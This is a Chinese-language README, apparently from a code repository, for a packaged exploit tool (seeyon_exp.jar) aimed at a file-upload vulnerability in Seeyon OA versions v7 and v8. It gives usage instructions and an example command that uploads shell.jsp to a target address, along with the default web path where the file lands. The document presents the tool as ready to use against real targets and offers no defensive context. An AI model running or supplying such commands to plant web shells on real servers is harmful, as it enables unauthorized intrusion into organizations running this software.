# seeyon_ajax_exp

致远OA文件上传漏洞利用脚本

已知影响版本：致远oa v7,v8

脚本已经打包好，没有任何防护，可直接查看源码，不存在后门。

使用方法：java -jar seeyon_exp.jar 目标地址 上传文件名字 上传文件绝对路径

例:      java -jar seeyon_exp.jar 10.10.10.10:8080 shell.jsp C:\Users\nex1less\Desktop\222.txt

默认路径为:ip + /seeyon/ + 文件名
